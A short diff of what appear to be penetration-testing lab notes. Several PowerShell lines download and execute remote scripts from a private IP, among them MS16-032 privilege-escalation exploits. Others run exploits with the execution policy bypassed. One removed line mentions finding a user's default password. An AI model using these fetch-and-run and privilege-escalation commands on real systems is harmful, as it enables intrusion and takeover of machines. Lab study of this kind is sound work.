@@ -51,7 +51,6 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/ms16_032_intrd_mod.ps1')
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/39719.ps1')
 
-Invoke-Allchecks 可以看到sarah的default password
 
 powershell -ExecutionPolicy bypass -File ./39719.ps1
 powershell -ExecutionPolicy bypass -File ./ms16-032.exe
